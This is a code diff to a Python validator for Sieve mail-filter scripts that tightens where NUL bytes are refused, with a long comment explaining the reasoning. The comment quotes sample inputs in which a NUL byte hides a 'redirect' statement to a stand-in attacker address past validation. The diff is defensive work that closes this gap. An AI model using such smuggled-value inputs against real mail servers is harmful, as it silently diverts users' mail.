@@ -1607,20 +1607,37 @@ def _unwritable_byte_error(script: SieveScript) -> str | None:
     while `RawBlock.text` grants arbitrary statements by design and by ADR 0002
     regardless, so a NUL buys an attacker nothing he does not already have.
 
-    A RULE'S `source` IS NOT EXEMPT, and an earlier version of this comment
-    claimed the lockout case put the NUL in `text` and `source` and nowhere else.
-    That is true only of a NUL that breaks lexing.
-    `parse_sieve('# note\x00here\n# --- n ---\nif ...')` lexes fine and yields a
-    RULE whose `source` carries the NUL. `source` is client-supplied and needs
-    only to survive `span_is_faithful` — and a comment ABOVE a rule rides in the
-    span BY DESIGN, in no compared field — so exempting it there made `source` a
-    free-text channel and wrote `# lead\x00redirect "attacker@example.com";` to
-    the mail server with a 200, byte-identical.
+    SO THE EXEMPTION REACHES ONLY AS FAR AS THAT REASON DOES: a `source` is
+    exempt when the NUL is in the block's own `text`, and not otherwise. Two
+    earlier scopings were wider than their own rationale, both for one structural
+    reason — bytes an entry was parsed from that land in NO COMPARED FIELD, and
+    therefore need only survive `span_is_faithful`, which cannot see them:
 
-    THE RESIDUAL COST, named rather than left to be discovered: a user whose file
-    lexes AND carries a NUL in a comment above a rule can no longer save it. That
-    is the same cost already accepted for a lone CR, which is refused in `source`
-    unconditionally. Accepting it for one byte and not the other was two opposite
+      - A RULE'S `source`. An earlier version of this comment claimed the lockout
+        case put the NUL in `text` and `source` and nowhere else; that is true
+        only of a NUL that BREAKS LEXING.
+        `parse_sieve('# note\x00here\n# --- n ---\nif ...')` lexes fine and gives
+        a RULE whose `source` carries the NUL, and exempting it there wrote
+        `# lead\x00redirect "attacker@example.com";` to the mail server, 200 and
+        byte-identical.
+      - A RAWBLOCK'S LEADING GAP. The parser keeps only the LAST comment line as
+        `comment`; earlier lines, and blank lines, stay in `source` alone. So
+        `'# a\x00redirect "atk@e.com";\n# b\nvacation :days 7 "Away";\n'` has
+        `comment == 'b'`, a clean `text`, and the NUL in neither — the
+        single-comment shape was refused and this one was not.
+
+    Marginal capability over `RawBlock.text` is nil either way, since that field
+    already grants arbitrary statements deliberately. The reason to refuse it is
+    that these bytes sit in no modelled field at all, so they survive parse →
+    display → save invisibly, and an exemption wider than the reason given for it
+    is one nobody can check.
+
+    THE RESIDUAL COST, named rather than left to be discovered: a NUL ANYWHERE in
+    a Rule's span is now refused — not only in a comment above it, but inside a
+    quoted value (`"sp\x00am"`) and in a trailing in-body comment, both of which
+    lex, are faithful, and are refused. Same for a RawBlock's leading gap. That is
+    the cost already accepted for a lone CR, which is refused in `source`
+    unconditionally; accepting it for one byte and not the other was two opposite
     principles applied to one shape.
 
     NOT CHECKED, DELIBERATELY: \x0b, \x0c, \x85, U+2028 and U+2029 all reach the
@@ -1640,6 +1657,10 @@ def _unwritable_byte_error(script: SieveScript) -> str | None:
         else:
             one_comment_line.append(entry.comment)
             written_verbatim.append(entry.text)
+            if "\x00" not in entry.text:
+                # The NUL is not in the bytes the exemption is for, so whatever
+                # else the span holds is not covered by it.
+                no_nul.append(entry.source)
 
     for text in one_comment_line:
         if "\n" in text:
